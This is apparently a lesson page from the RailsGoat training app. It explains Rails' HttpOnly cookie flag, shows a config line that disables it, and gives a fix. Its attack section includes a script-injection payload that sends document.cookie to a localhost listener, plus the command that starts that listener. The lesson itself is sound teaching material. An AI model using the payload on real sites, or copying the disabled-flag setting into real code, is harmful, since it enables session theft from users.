# Description

The HttpOnly flag prevents access to the document.cookie attribute of the DOM via JavaScript. Helpful for limiting the impact of Cross-Site Scripting as it relates to session theft.

# Bug

By default, Ruby on Rails protects its' cookies with the HttpOnly flag. However, it is possible to disable this security protection and is not recommended. You can disable this protection using the flag highlighted below. This is an insecure and unnecessary change.

```ruby
Railsgoat::Application.config.session_store :cookie_store, key: '_railsgoat_session', httponly: false
```

# Solution

### Lack of the HttpOnly Flag - ATTACK

Navigate to the sign-up page, sign up as a user, but in the first name field, enter:

```javascript
<script>document.location="http://localhost:8000/" + document.cookie </script>
```

Additionally, fire up Python's SimpleHTTPServer module using the following command:

```bash
$ python -m SimpleHTTPServer
```

### Lack of the HttpOnly Flag - SOLUTION

Keep the default configuration "as-is" and do not make this change. If this exists in your code base, remove it.

# Hint

Can JavaScript interact with my session cookie?